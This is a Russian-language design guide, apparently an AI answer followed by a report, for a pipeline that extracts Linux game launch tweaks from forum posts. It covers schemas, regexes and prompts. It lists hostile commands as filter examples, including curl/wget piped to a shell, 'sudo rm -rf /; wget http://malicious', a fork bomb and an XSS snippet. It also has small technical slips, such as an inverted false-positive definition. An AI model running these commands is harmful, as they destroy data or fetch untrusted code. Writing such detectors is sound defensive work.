@@ -1,0 +1,777 @@
+Отвечу как инженер по security-aware extraction pipelines и compatibility systems для Linux gaming, с фокусом на извлечение действий из грязного user-generated текста.
+
+**TL;DR**: брат, самый норм путь тут — не пытаться одним промптом “понять всё”. Делай пайплайн из 3 слоёв:
+
+1. жёсткий фильтр опасного/нерелевантного,
+2. extraction в строгую схему,
+3. пост-валидация и нормализация.
+
+И да, важный момент: тебе надо отличать не только `safe` / `malicious`, а минимум `safe` / `risky` / `malicious` / `noise` / `diagnostic`. Это прям база. Иначе либо пропустишь хрень, либо выкинешь полезные, но опасноватые штуки вроде удаления префикса или правки `/etc`.
+
+Я бы мыслил так.
+
+Твой входной текст из интернета обычно содержит смесь из:
+“у меня заработало с GE-Proton 9-25”,
+“добавь `PROTON_USE_WINED3D=1 %command%`”,
+“переименуй intro video”,
+“поставь пакет такой-то”,
+“удали prefix”,
+“отруби secure boot/selinux/антивирус/фаервол”,
+“скачай левый бинарь с гитхаба”,
+“curl ... | bash”,
+“переустанови винду” )
+
+То есть тебе надо извлекать не просто “советы”, а **нормализованные действия**.
+
+Какие сущности и action types я бы вытаскивал.
+
+Во-первых, то, что реально относится к запуску игры:
+
+`launch_options` — всё, что идёт в Steam launch options.
+Сюда входят env vars перед `%command%`, аргументы после `%command%`, флаги бинаря, gamescope-обёртки и т.д.
+
+Примеры:
+`PROTON_LOG=1 %command%`
+`DXVK_ASYNC=1 MANGOHUD=1 %command% -windowed`
+`gamescope -W 1920 -H 1080 -- %command%`
+
+`runner_selection` — выбор раннера:
+Proton Experimental, Proton Hotfix, Proton 9.x, GE-Proton, Luxtorpeda, Wine-GE, wine-tkg и т.д.
+
+`compat_tool_version` — конкретная версия:
+`GE-Proton9-25`
+`Proton Experimental bleeding-edge`
+`umu + GE-Proton9-26`
+
+`env_var` — отдельно нормализованные переменные:
+имя, значение, где применяется, scope.
+Например:
+`PROTON_USE_WINED3D=1`
+`PROTON_NO_ESYNC=1`
+`VKD3D_CONFIG=dxr11,dxr`
+`WINE_FULLSCREEN_FSR=1`
+
+`binary_argument` — аргументы игре/лаунчеру:
+`-dx11`, `-windowed`, `--skip-launcher`, `-nobattleye`
+
+`executable_override` — запуск не дефолтного exe:
+“launch `Game/Binaries/Win64/foo.exe` instead of launcher”
+или “point executable to shipping binary”.
+
+`compatdata_action` / `prefix_action` — действия над wine prefix / compatdata:
+удалить prefix, создать новый, удалить конкретные кэши, удалить DXVK state cache, править `pfx`, заменить dll, симлинки.
+
+`file_patch` — изменение файлов игры/конфигов:
+INI / JSON / XML / YAML / CFG / registry-like files.
+Надо тащить:
+путь к файлу, тип операции (`set`, `append`, `remove`, `rename`, `replace`), ключ/секция/значение.
+
+Примеры:
+“set `fullscreen=false` in `GameUserSettings.ini`”
+“rename `intro.mp4` to disable video”
+“append `PROTON_ENABLE_NVAPI=1` to launch script”
+
+`registry_patch` — если совет про wine regedit:
+ключ, value name, type, data.
+
+`protontricks_action` / `winetricks_action` — установка компонентов:
+`vcrun2019`, `dxvk`, `dotnet48`, `d3dcompiler_47`, `mf`, `faudio` и т.д.
+
+`dependency_install` — внешние зависимости:
+пакеты системы, 32-bit libs, Vulkan ICD, Mesa/NVIDIA userspace, gamemode, gamescope, mangohud, pipewire, xrandr, SDL libs.
+
+`graphics_stack_requirement` — требования или workaround’и:
+Mesa >= N, NVIDIA >= N, RADV vs AMDVLK, disable NVAPI, DXVK version pin, VKD3D workaround.
+
+`session_requirement` — Wayland / X11 / DE / compositor штуки:
+“works only on X11”
+“disable fractional scaling”
+“run under gamescope”
+“disable Steam overlay”
+“disable compositor”
+“use KDE, not GNOME Wayland”
+Это полезно, но по risk’у уже аккуратнее.
+
+`kernel_or_system_tweak` — sysctl, grub params, modules, udev, fs perms.
+Вот это уже почти всегда `risky`, даже если совет может быть legit.
+
+`network_or_service_tweak` — отключение EOS/anticheat service, firewall, DNS hacks.
+Часто либо шум, либо риск.
+
+`diagnostic_action` — не фикс, а сбор сигнала:
+`PROTON_LOG=1`
+`WINEDEBUG=...`
+`journalctl -b`
+`MESA_VK_WSI_PRESENT_MODE=...`
+`strace`
+Это стоит хранить отдельно. Оно не “чинит”, но помогает твоей системе понимать next-step.
+
+`observation` — факт без действия:
+“crashes after splash”
+“works only after intro”
+“launcher broken, game exe works”
+Это вообще золотой сигнал для recommendations engine. Не выкидывай.
+
+Теперь про фильтрацию хрени. Я бы разделил так.
+
+`malicious` — явный мусор/вредонос/левак, который не нужен для запуска игры вообще.
+Сюда:
+кража токенов/куки/паролей,
+скачивание и запуск непонятного скрипта/бинаря из левого места,
+команды разрушительного характера,
+изменения не связанные с игрой,
+persistency, ssh keys, cron, browser data, wallet stuff, майнеры, reverse shells.
+
+На практике флаги такие:
+`curl|wget ... | sh/bash`
+`sudo` + широкие destructive/file ops
+`rm -rf` по широким путям
+`dd`, `mkfs`, `fdisk`, `chmod -R 777`, `chown -R` по системным деревьям
+правки `~/.ssh`, browser profiles, wallets
+добавление автозапуска, systemd services, cron без прямой связи с игрой
+загрузка “fixed crack exe” непонятно откуда
+
+`risky` — может помочь, но scope слишком широкий или rollback неочевиден.
+Сюда:
+изменения `/etc`, `grub`, `sysctl`, kernel params, BIOS/UEFI, Secure Boot, SELinux/AppArmor, firewall, blacklisting modules, глобальная замена драйвера, репозитории third-party, глобальные chmod/chown, system-wide Vulkan symlink hacks.
+
+`safe` — локальные и обратимые действия в рамках Steam/game/prefix/user config.
+Удалить конкретный compatdata для AppID — обычно safe-ish.
+Удалить весь `~/.steam` — уже не safe.
+
+`noise` — рофлы, “works on my machine”, “just reboot”, “buy windows”, “skill issue”, “install arch”, “pray”, “verify files and hope”.
+
+`diagnostic` — логирование и сбор инфы, без ремедиации.
+
+Вот где многие косячат: удаление prefix — это не malicious, но и не совсем harmless. Я бы ставил:
+`category = remediation`
+`risk = medium`
+`scope = app_local`
+`reversible = partially`
+Так ты не теряешь полезный совет и не помечаешь его как зло.
+
+Теперь — какие поля должны быть в хорошем extraction JSON.
+
+Я бы делал примерно так:
+
+```json
+{
+  "text_classification": {
+    "contains_malicious": false,
+    "contains_risky": true,
+    "contains_safe_actions": true,
+    "contains_diagnostic_actions": false,
+    "contains_noise": false
+  },
+  "actions": [
+    {
+      "action_type": "launch_options",
+      "raw_span": "PROTON_USE_WINED3D=1 %command% -windowed",
+      "normalized": {
+        "env": [
+          {"name": "PROTON_USE_WINED3D", "value": "1"}
+        ],
+        "command_template": "%command%",
+        "args": ["-windowed"]
+      },
+      "target_scope": "steam_game",
+      "risk": "low",
+      "reversible": true,
+      "confidence": 0.97,
+      "conditions": [
+        {"kind": "symptom", "value": "black screen"},
+        {"kind": "gpu_vendor", "value": "unknown"}
+      ]
+    }
+  ],
+  "observations": [
+    {
+      "raw_span": "launcher crashes but direct game exe works",
+      "normalized": {
+        "symptom": "launcher_crash",
+        "workaround_hint": "use_direct_executable"
+      },
+      "confidence": 0.93
+    }
+  ],
+  "rejected_spans": [
+    {
+      "raw_span": "just disable secure boot and firewall",
+      "reason": "risky_system_wide_tweak"
+    }
+  ]
+}
+```
+
+Вот это уже топ. Не просто “вытащи флаги”, а ещё храни:
+`raw_span` — чтобы была трассировка,
+`risk`,
+`scope`,
+`reversible`,
+`conditions`,
+`confidence`.
+
+Без этого потом начнётся ситуэйшн пиздейшн, когда движок не понимает, это совет для Steam Deck, для NVIDIA, для Wayland, для конкретного античита или для AMD на Mesa 25.
+
+Теперь важная база: **не полагайся только на LLM для malicious filter**.
+LLM хорош для смысла и контекста, но не для окончательного security gate.
+
+Нормальная схема такая:
+
+Слой 1 — детерминированные правила.
+Регексы/парсер/AST для команд, URL, путей, sudo, destructive ops, network fetch + execute, system-wide edits.
+
+Слой 2 — LLM extraction/classification.
+Понимает “что именно советуют”, даже если текст кривой.
+
+Слой 3 — policy engine.
+Проверяет extracted actions against allowlist/denylist/risk model.
+
+Например:
+если `action_type = dependency_install` и пакет похож на `lib32-vulkan-radeon`, `gamemode`, `gamescope`, окей.
+Если “curl custom fix script from mega.nz”, в помойку.
+Если file patch path внутри `compatdata/<appid>` или game config dir — норм.
+Если path уходит в `/etc`, `/boot`, `~/.ssh`, `/usr/lib` — риск.
+
+Теперь по списку сущностей, которые я бы точно хотел вытаскивать.
+
+Для Steam/launch layer:
+
+* `%command%`
+* env var assignments перед командой
+* wrapper tools (`gamescope`, `mangohud`, `gamemoderun`, `prime-run`, `obs-gamecapture`, `taskset`)
+* cli args после `%command%`
+* прямые указания “launch without launcher”, “skip intro”, “windowed first run”
+
+Для Proton/Wine layer:
+
+* тип раннера
+* версия раннера
+* protontricks/winetricks verbs
+* dll overrides
+* regedit tweaks
+* wine/proton env vars
+* prefix reset / prefix migration / separate prefix
+
+Для filesystem/config layer:
+
+* путь файла
+* тип файла
+* patch operation
+* section/key/value
+* rename/delete/copy/symlink
+* direct exe path
+* anti-launcher bypass
+
+Для runtime/system layer:
+
+* packages
+* libraries
+* 32-bit deps
+* graphics driver version constraints
+* Wayland/X11 requirement
+* overlay toggles
+* compositor settings
+* gamescope usage
+* kernel/sysctl/grub tweaks
+
+Для context layer:
+
+* target platform: Steam Deck / desktop Linux / distro
+* GPU vendor: AMD / NVIDIA / Intel
+* stack: Mesa / RADV / AMDVLK / NVIDIA proprietary
+* display server: Wayland / X11
+* game store: Steam / Lutris / Heroic / Bottles
+* symptom: black screen / launcher crash / EAC fail / stutter / no audio / intro video hang / controller missing / crash on startup
+
+Вот context layer вообще имба. Потому что один и тот же твик без условий — мусор.
+`PROTON_USE_WINED3D=1` без симптома — слабый совет.
+А вот “для black screen on NVIDIA on Wayland” — уже мясо.
+
+Теперь про сам промпт.
+
+Я бы делал два промпта, не один.
+
+Первый — классификатор/guard. Он должен быть скучный, жёсткий и консервативный.
+
+Пример:
+
+```text
+You are a security-aware extraction gate for Linux game compatibility tips.
+
+Task:
+Analyze a user-generated text snippet about making a game run on Linux.
+Classify all content into:
+- safe_action
+- risky_action
+- malicious_action
+- diagnostic_action
+- observation
+- noise
+
+Definitions:
+- safe_action: local, reversible, game-related actions limited to Steam launch options, Proton/Wine settings, game config files, game-local files, app-local prefix/cache, or normal package installs directly related to gaming.
+- risky_action: system-wide, privilege-requiring, security-weakening, hard-to-revert, or broad-impact actions. Examples include editing /etc, GRUB, sysctl, kernel params, disabling Secure Boot, disabling security controls, changing drivers globally, broad chmod/chown, blacklisting modules.
+- malicious_action: actions unrelated to game compatibility, destructive operations, credential/token theft, remote script execution from untrusted sources, persistence, exfiltration, wallet/browser/SSH manipulation, broad file deletion, suspicious binaries or cracks.
+- diagnostic_action: actions that collect logs or debug info without directly fixing the issue.
+- observation: statements describing symptoms, outcomes, or conditions, with no direct action.
+- noise: jokes, vague advice, irrelevant content, low-signal comments.
+
+Rules:
+- Be conservative. If unsure between safe and risky, choose risky.
+- Never invent actions that are not clearly stated.
+- Preserve exact quoted commands, paths, variables, file names, and versions.
+- Output JSON only.
+- For each span, include the original text span, category, reason, and confidence.
+
+Return schema:
+{
+  "spans": [
+    {
+      "raw_span": "...",
+      "category": "safe_action|risky_action|malicious_action|diagnostic_action|observation|noise",
+      "reason": "...",
+      "confidence": 0.0
+    }
+  ],
+  "summary": {
+    "contains_malicious": false,
+    "contains_risky": true,
+    "contains_safe": true,
+    "contains_diagnostic": false,
+    "contains_observation": true,
+    "contains_noise": false
+  }
+}
+```
+
+Этот guard хорош тем, что сначала разрезает текст на meaningful spans. И потом второй промпт уже работает только по `safe_action`, `risky_action`, `diagnostic_action`, `observation`.
+
+Второй — extractor.
+
+```text
+You extract structured Linux game compatibility actions from user text.
+
+Input:
+A list of text spans already classified as safe_action, risky_action, diagnostic_action, or observation.
+
+Your job:
+1. Extract explicit actions and observations only.
+2. Normalize them into a canonical schema.
+3. Preserve uncertainty and conditions.
+4. Do not merge separate actions unless the text clearly couples them.
+5. Do not infer missing versions, paths, package names, or variables.
+6. If a span contains a negation ("do not use", "disable", "remove"), preserve that semantics.
+
+Supported action types:
+- launch_options
+- env_var
+- binary_argument
+- executable_override
+- runner_selection
+- compat_tool_version
+- protontricks_action
+- winetricks_action
+- file_patch
+- prefix_action
+- registry_patch
+- dependency_install
+- graphics_stack_requirement
+- session_requirement
+- overlay_toggle
+- system_tweak
+- diagnostic_action
+- observation
+
+For each extracted item, return:
+- action_type
+- raw_span
+- normalized
+- target_scope
+- risk
+- reversible
+- requires_privilege
+- conditions
+- evidence_tags
+- confidence
+
+Normalization rules:
+- Steam launch options: separate env vars, wrapper tools, command template, args.
+- Env vars: return name and string value.
+- Versions: preserve exact textual version.
+- File patches: classify operation as set/add/remove/replace/rename/delete/copy/symlink.
+- Prefix actions: scope them to app-local if tied to a specific compatdata or Steam app.
+- Observations: normalize symptom/outcome where obvious, otherwise keep raw form.
+
+Output JSON only.
+
+Schema:
+{
+  "actions": [],
+  "observations": [],
+  "unparsed_spans": []
+}
+```
+
+Но я бы ещё усилил extraction schema. Например так:
+
+```json
+{
+  "action_type": "file_patch",
+  "raw_span": "rename intro.mp4 to intro.mp4.bak",
+  "normalized": {
+    "operation": "rename",
+    "path": "intro.mp4",
+    "new_path": "intro.mp4.bak"
+  },
+  "target_scope": "game_files",
+  "risk": "low",
+  "reversible": true,
+  "requires_privilege": false,
+  "conditions": [
+    {"kind": "symptom", "value": "hang_on_intro_video"}
+  ],
+  "evidence_tags": ["video_workaround"],
+  "confidence": 0.94
+}
+```
+
+Что ещё стоит добавить в промпт, чтобы он не галлюцинировал как бот на энергетиках.
+
+Прямо прописать:
+
+* не создавать action, если есть только гипотеза без императива;
+* не превращать observation в fix;
+* не объединять два разных совета в один;
+* не считать общий bash-командлет “запуском игры”, если это просто обсуждение;
+* различать “works with X” и “install X”;
+* различать “don’t use Proton Experimental” и “use Proton Experimental”;
+* различать “delete shader cache” и “delete Steam install”.
+
+Это мега важно. Большая часть трэша в extraction — из-за потери отрицаний и scope.
+
+Например:
+“Deleting the prefix didn’t help, but switching to GE-Proton 9-25 did.”
+Если промпт туповат, он вытащит оба как рекомендации.
+А надо:
+
+* `prefix_action(delete)` с `effect = ineffective`
+* `runner_selection(GE-Proton 9-25)` с `effect = effective`
+
+То есть да, я бы даже добавил поле `reported_effect`:
+
+* `effective`
+* `ineffective`
+* `unclear`
+* `temporary`
+* `diagnostic_only`
+
+Вот это уже прям очень жирно для ranker’а.
+
+Ещё одна важная штука — лучше иметь отдельный список `patterns_to_parse_without_llm`.
+
+Потому что часть вещей изи достаётся регулярками/парсерами:
+
+* env vars: `\b[A-Z0-9_]+=(?:"[^"]*"|'[^']*'|[^\s]+)`
+* `%command%`
+* proton versions / GE versions
+* package install commands
+* file paths
+* quoted commands
+* appid / compatdata paths
+* exe/dll file names
+* known tools: `protontricks`, `winetricks`, `gamescope`, `gamemoderun`, `mangohud`, `prime-run`
+
+LLM пусть допонимает контекст и размечает смысл, а не делает всю грязную работу сам. Это уменьшит стоимость, латентность и долю шизы.
+
+Я бы вообще собрал вот такую архитектуру:
+
+1. Preprocess:
+   очистка markdown, цитат, html, форумного мусора, emoji, bbcode.
+   Но обязательно сохраняй code spans и block quotes.
+
+2. Deterministic spotting:
+   команды, env vars, paths, versions, URLs, package names, known tweak lexicon.
+
+3. Security heuristics:
+   быстрый denylist / risk markers.
+
+4. LLM guard classification.
+
+5. LLM extraction only on разрешённых span’ах.
+
+6. Post-validation:
+   allowlist action types, path scope validation, package sanity, command parser, version format validation.
+
+7. Recommendation store:
+   храни не только action, но и conditions, symptom, effect, confidence, raw evidence.
+
+Чел, ещё один момент: тебе нужны не только “что сделать”, но и “для каких условий это релевантно”.
+Иначе потом recommendation engine начнёт советовать `PROTON_USE_WINED3D=1` вообще всем подряд, а это уже кринж.
+
+Поэтому я бы вытаскивал ещё:
+
+* `applies_to_gpu_vendor`
+* `applies_to_driver_stack`
+* `applies_to_session`
+* `applies_to_store`
+* `applies_to_runner`
+* `applies_to_game_version`
+* `applies_to_symptom`
+* `applies_to_distro`
+* `applies_to_kernel_range`
+
+Даже если часто там будет `unknown`, структура должна быть.
+
+И последнее: хороший промпт должен не просто вытаскивать действия, а **отмечать границу доверия**.
+То есть:
+“точно указанный launch option” — confidence 0.98
+“кажется, помогло через gamescope на AMD” — 0.62
+“someone said update drivers” — это почти noise/weak generic.
+
+По сути, тебе нужен не просто extractor, а **evidence normalizer**.
+
+Если сжать всё до практической базы, то я бы делал такой minimal viable ontology:
+
+* observation
+* launch_options
+* env_var
+* runner_selection
+* compat_tool_version
+* executable_override
+* file_patch
+* prefix_action
+* protontricks_action
+* dependency_install
+* session_requirement
+* graphics_stack_requirement
+* diagnostic_action
+* risky_system_tweak
+* malicious_action
+* noise
+
+Этого уже хватит, чтобы начать, а потом нарастить registry/dll overrides и т.д.
+
+И да, самый важный practical совет:
+не заставляй модель сразу решать “malicious ли это” на всём тексте целиком.
+Пусть сначала режет на spans, потом классифицирует по кускам. Иначе одна злая команда в длинном посте испортит тебе extraction полезных вещей.
+
+Если хочешь, я следующим сообщением могу сразу собрать тебе **production-ish JSON schema + набор few-shot примеров на 10–15 реальных Linux gaming советов**, чтобы это можно было почти сразу пихать в пайплайн.
+
+
+Автоматизированная система извлечения твиков запуска Linux-игр
+Резюме: Современные игры на Linux часто требуют «твиков» запуска (специальных параметров командной строки, переменных окружения, патчей и т.д.) для оптимальной работы через Proton/Wine
+. Наша цель – спарсить пользовательский текст (русский форумный пост или запрос), фильтровать вредоносные/бесполезные фрагменты и извлекать из него настройки запуска. Эти настройки мы разбиваем на категории (см. ниже), а затем формируем структурированный вывод (JSON) и рекомендацию. В отчёте даны: классификация типов твиков с примерами, стратегии парсинга (регулярные выражения, NER и эвристики), методы обнаружения «шумных» или злонамеренных команд (с примерами безопасных/опасных фрагментов), схема выходных данных (JSON-схема + образцы), шаблоны подсказок для модели и подход к оценке (метрики, тестовый датасет и примеры).
+
+Категории настраиваемых параметров
+Основные категории извлекаемых твиков запуска игр на Linux следующие:
+
+Параметры запуска (Launch Options): Префиксы с - или --, например -novid, -windowed, -dxlevel 95 и др. (обычно добавляются в свойствах игры Steam
+).
+Переменные окружения (Environment Variables): Например PROTON_USE_WINED3D=1, WINEPREFIX=~/games/mywine и т.п. Они задаются перед командой запуска (до %command% в Steam)
+. Пример: PROTON_NO_D3D11=1 %command% выключает D3D11 в Proton
+.
+Названия исполняемых файлов (Executable Names): Упоминание конкретных .exe, .AppImage, скриптов и т.п., например game.exe, start.sh. Полезно для выявления того, какая программа запускается.
+Версии Proton/Wine: Указание версий совместимости, например Proton 10.0-4, Wine 7.0, Proton-GE 7.24 и т.п. Эти значения можно распознавать через шаблоны вида Proton\s*\d+\.\d+(-\d+)? или Wine\s*\d+\.\d+ (см. пример регулярного выражения ниже).
+Патчи конфигураций (Config Patches): Упоминания о замене или патче файлов конфигурации игры или движка (например, «заменить dll», «добавить ключ в .ini»), либо команды regedit для правки реестра Wine.
+DLL-переопределения (WINEDLLOVERRIDES): Например WINEDLLOVERRIDES="d3d9,b", dinput8.dll=ntdll. Указывают, что Wine должен использовать встроенную или родную библиотеку вместо стандартной. Эти строки часто упоминаются явно.
+Флаги Proton: Специальные переменные, влияющие на Proton, например PROTON_HIDE_NVIDIA_GPU=1, PROTON_HEAP_DELAY_FREE=1 и т.д. (описаны в документации Proton как runtime-опции
+).
+Опции Steam: Специальные указатели для Steam (например, SteamDeck=0 для отключения режима Deck, либо профили Mangohud: MANGOHUD=1), а также команды типа gamescope -r 60 -- %command%. Как отмечено в документации, эти опции позволяют «передавать переменные окружения, аргументы и команды» в игры
+.
+Игровые фиксы: Описанные пользователями обходные решения для конкретных игр, например «переместить файл libnm в Wine», «изменить подпись EXE», «выключить intro через редактирование INI». Такие рекомендации обычно распознаются по контексту (имена игр, часто разноязычные термины).
+Редактирование файлов/реестра: Указания типа sed -i '...', echo >> config.ini, regedit /en ... и т.п., которые меняют файлы конфигурации или реестр перед запуском игры.
+Пример: пользователь может написать:
+“Для запуска Borderlands 3 на Proton нужно установить WINEPREFIX=~/bl3prefix WINEARCH=win64, включить PROTON_USE_WINED3D=1 и добавить -novid в опции запуска. Также в реестре надо выставить ключ HKEY_CURRENT_USER\Software\Wine....”
+Из этого фрагмента мы извлекаем категории: Переменные окружения (WINEPREFIX, WINEARCH, PROTON_USE_WINED3D), Параметры запуска (-novid), Исполняемый файл (можно по контексту вывести Borderlands3.exe), Исправление реестра (описано изменение ключа).
+
+Стратегии разбора
+Для извлечения настроек из неструктурированного текста используется сочетание методов: токенизация, регулярные выражения, Named-Entity Recognition (NER) и эвристические правила. Ключевые подходы:
+
+Токенизация и NER: Разбиваем текст на токены (словами, пунктуацией). Настраиваем NER-модель или правило для распознавания сущностей типа EnvVar, Version, Flag, Path, GameName и т.д. Например, сущность EnvVar может определяться как последовательность [A-Z0-9_]+=значение. Сущность Path – по шаблону файловой системы Linux или Windows.
+
+Регулярные выражения: Для каждой категории задаём паттерны. Примеры шаблонов (Python-стиль):
+
+regex
+Copy
+# Переменная окружения: ключ=значение (до пробела или конца строки)
+r'\b(?P<key>[A-Z0-9_]+)=(?P<value>[^ \t\n]+)'
+# Флаг запуска: слово с дефисом, например -новид или --option
+r'(?P<flag>-\w[\w-]*)\b'
+# Путь к файлу (Linux/Windows)
+r'(?P<linux_path>/[^ \t\n]+)'
+r'(?P<windows_path>[A-Za-z]:\\[^ \t\n]+)'
+# Версия Proton/Wine: Proton 10.0-4 или Wine 7.0
+r'Proton\s*(?P<ver>\d+\.\d+(-\d+)?)'
+r'Wine(?:-т?GUI)?\s*(?P<ver_wine>\d+\.\d+)'
+Пример использования: из фразы WINEPREFIX=~/games/g1 wine 7.0 game.exe первым шаблоном извлекается key=WINEPREFIX, value=~/games/g1, а третьим – version=7.0.
+
+Эвристики и контекст: Проверяем расположение токенов. Например, если перед списком аргументов встретилось %command%, то всё, что до него – это переменные окружения
+. Если слово заканчивается на .exe или .dll, это может быть название исполняемого файла или библиотеки. Если токен окружен кавычками или апострофами, возможно, это строка пути или аргумент. Изучаем контекст: после слов Proton или Wine обычно следует номер версии. Группы слов Enable, Disable, Force часто предшествуют флагам или параметрам (например, Enable DXVK – включает использование DXVK).
+
+Дисамбигуация: При пересечении шаблонов применяются приоритеты. Например, строку -novid в первую очередь выделяем как LaunchOption, а не как часть пути. Путь с дефисом (/home/user/Games/my-game.exe) не путать с флагом. Значения, похожие на URL (http://, ftp://), помечаем как подозрительные.
+
+Пример регулярных выражений и крайних случаев:
+
+regex
+Copy
+# Именованное захватывающее окружение: переменная окружения вида КЛЮЧ=значение
+env_regex = re.compile(r'(?P<key>[A-Z][A-Z0-9_]+)=(?P<value>[^ \t;]+)')
+# Квадратные скобки/запятые: убираем, чтобы не захватывать избыточно
+path_regex = re.compile(r'([A-Za-z]:\\[^ "<>]+)|(/[^ \t"<>\n]+)')
+# Запуск на Proton: упоминание Proton + версия
+proton_regex = re.compile(r'Proton\s*(?P<version>\d+\.\d+(-\d+)?)', re.IGNORECASE)
+# Чаще всего '--' обозначает более длинную опцию
+steam_flag_regex = re.compile(r'--?(?P<flag>\w[\w-]*)')
+Крайние случаи: "=`` может встречаться в URL (https://example.com?a=b`). Поэтому при поиске key=value проверяем, что ключ не содержит ://. Переменная окружения обычно великого регистра, а значение – слово без пробелов. Параметр запуска может идти сразу после -- или -, но может встречаться и как часть имени файла (например, game-legacy.exe). Поэтому контекст и шаблоны должны гибко учитывать эти нюансы.
+
+Обнаружение вредоносного и шумового содержимого
+Перед обработкой текста нужно отфильтровать потенциально опасные или не относящиеся к теме фрагменты.
+
+Черные списки и шаблоны: Определяем ключевые слова или шаблоны, характерные для вредоносных команд. Например, конструкции rm -rf, sudo, chmod +x, ссылки (http://, bit.ly), вложенные теги <script>, SQL-подобные фразы (DROP TABLE) и т.д. Рекомендуется проверять такие паттерны через регулярки. Например, шаблон .*(rm\s+-rf|<script>|curl\s+|wget\s+).* выявит попытки удаления/скачивания
+.
+
+Белые списки: Альтернативно – разрешить только «безопасные» символы или слова. Но в нашем случае текст может содержать спецсимволы (пути, команды), поэтому полностью строгий whitelist может быть неприменим. Вместо этого комбинируем эвристику: если строка содержит хотя бы один из подозрительных паттернов, помечаем её как опасную или отброс.
+
+Контекстная проверка: Если фрагмент выглядит как композитная команда (несколько команд через &&, ; и т.д.), вероятно, это скрипт-пayload. Обычная рекомендация по настройке запуска игры практически никогда не требует вложенных команд или скачивания из интернета. Поэтому наличие ;, && и подстрок http:///https:// – тревожный сигнал.
+
+Пример правил/паттернов:
+
+rm -rf, sudo rm, dd if=, :(){ :|:& };: (fork-bomb) ⇒ опасно.
+curl, wget, ftp://, mailto: ⇒ опасно (нужны ввод-вывод в сеть).
+<script>, document.cookie, eval( ⇒ XSS/скрипт (неуместно в контексте игровых твиков).
+SQL-фразы: SELECT, INSERT, DROP (могут встречаться в инстукциях по управлению БД или в шутливом тексте) ⇒ опасно, если нет контекста игры
+.
+Безопасные примеры: только ключи/значения без сетевых вызовов: PROTON_USE_WINED3D=1 %command%, -novid, WINEPREFIX=/home/user/.wine – классические твики.
+Примеры отказа:
+Опасный: "sudo rm -rf /; wget http://malicious" – удаление системы.
+Опасный: "<script>alert('hacked')</script>" – XSS.
+Размытый/шум: обычный разговорный текст: «привет, что делаешь?» или оффтоп: «когда выйдет новая игра». Такие фрагменты нужно игнорировать.
+ML-подходы: Помимо правил, можно обучить бинарный классификатор (например, на основе текстовых эмбеддингов или n-грамм) отличать безопасные форумы-тексты от атакующих. Например, собрать примеры запросов с твиками (на форуме) как позитив и примеры инъекций команд как негатив, затем оценивать вероятность. Однако для нашей доменной задачи правило/шаблонный подход обычно достаточно точен и проще реализуем. Для повышения точности на больших данных можно применить методы типа RandomForest или нейросети на отборе ключевых слов.
+
+Структура вывода (JSON-схема)
+Результатом парсинга должна быть структурированная JSON-выдача, содержащая список найденных параметров с их категориями, значениями и уровнем уверенности. Пример JSON-схемы:
+
+json
+Copy
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "type": "object",
+  "properties": {
+    "entries": {
+      "type": "array",
+      "items": {
+        "type": "object",
+        "properties": {
+          "category": {
+            "type": "string",
+            "enum": [
+              "EnvVar", "LaunchOption", "Executable", "ProtonVersion",
+              "WineVersion", "ConfigPatch", "DLLOverride", "FileEdit", "RegistryEdit"
+            ]
+          },
+          "key":   {"type": "string"},
+          "value": {"type": ["string","number"], "pattern": ".+"},
+          "confidence": {"type": "number", "minimum": 0, "maximum": 1}
+        },
+        "required": ["category","key","value"]
+      }
+    },
+    "timestamp": {"type": "string", "format": "date-time"}
+  },
+  "required": ["entries"]
+}
+entries: массив найденных элементов.
+category: категория параметра (взятая из указанного списка).
+key: имя параметра (например, название переменной, флага, имени файла).
+value: его значение (например, '1' для PROTON_NO_D3D11=1). Может быть строкой или числом.
+confidence: оценка достоверности (0–1) данного извлечения.
+Пример вывода: пусть система получила фрагмент PROTON_USE_WINED3D=1 %command%. Тогда она вернёт что-то вроде:
+
+json
+Copy
+{
+  "entries": [
+    {
+      "category": "EnvVar",
+      "key": "PROTON_USE_WINED3D",
+      "value": "1",
+      "confidence": 0.95
+    }
+  ],
+  "timestamp": "2026-03-09T03:21:00Z"
+}
+Ниже приведена таблица, демонстрирующая соответствие между фрагментом текста и извлечёнными параметрами:
+
+Исходный фрагмент	Извлечённый результат (JSON)
+PROTON_USE_WINED3D=1 %command%	[{"category":"EnvVar","key":"PROTON_USE_WINED3D","value":"1","confidence":0.95}]
+SteamDeck=0 %command% -novid	[{"category":"EnvVar","key":"SteamDeck","value":"0","confidence":0.90}, {"category":"LaunchOption","key":"-novid","value":null,"confidence":0.90}]
+WINEPREFIX=/home/user/pfx wine Game.exe	[{"category":"EnvVar","key":"WINEPREFIX","value":"/home/user/pfx","confidence":0.95}, {"category":"Executable","key":"Game.exe","value":null,"confidence":0.85}]
+Запустить с Wine 7.0 и включить ENG patch	[{"category":"WineVersion","key":"Wine","value":"7.0","confidence":0.90}]
+
+Здесь value может отсутствовать (null) для ключей-флагов без конкретного параметра (мы можем просто ставить null или true), если требуется.
+
+Шаблоны подсказок (prompt templates)
+Для модели извлечения:
+
+Пример 1: «Извлеки из данного текста все параметры запуска и конфигурации для Linux-игры. Выведи JSON со списком объектов вида {"category","key","value"}. Игнорируй посторонние слова и опасные команды.»
+Пример 2: «Твоя задача — найти и структурировать настройки игры из текста. Категории: переменные окружения, параметры Steam, версии Proton/Wine и т.д. Выведи результат в JSON.»
+Для генерации рекомендаций для пользователя:
+
+Пример 1: «На основе найденных параметров запусти программу-советник, которая пишет пользователю на русском: какие действия выполнять (типа “для оптимизации включите X и Y”). Описание должно быть понятным геймеру.»
+Пример 2: «Дай подробную инструкцию по применению извлечённых твиков. Опиши шаги: какие команды выполнить, какие файлы редактировать. Учти их контекст.»
+Эти шаблоны помогают направлять модель: первый фокусируется на извлечении сущностей (предметная зона — конфиг-просодер), второй — на формате ответа для пользователя.
+
+Оценка системы
+Для верификации системы задаются следующие аспекты:
+
+Метрики качества: Стандартные метрики информации об объектах — точность (precision), полнота (recall), F1-мера для извлечения параметров. Для всего пайплайна (извлечение → рекомендации) можно учитывать также оценку человека (существует ли полезное совещание), BLEU/ROUGE для текстовых рекомендаций. Ещё важно метрика «False Positive» (чистота фильтра), чтобы вредонос не пропустить, и «False Negative» (не потерять безопасные твики).
+Датасет тестирования: Набор реальных пользовательских фраз на русском с твиками (биржа Q&A по играм, форумы ProtonDB на русском и т.д.) с размеченными параметрами. Должны быть как «правильные» твики, так и часто встречающийся шум/боты. Отдельно подготавливаются образцы с явным злоумышленным контентом (инъекции команд), а также с общим «чатом» (off-topic). Желательно разнообразие формулировок: добавление синонимов (например, «запускать с патчем»), упрощённая речь и т.д.
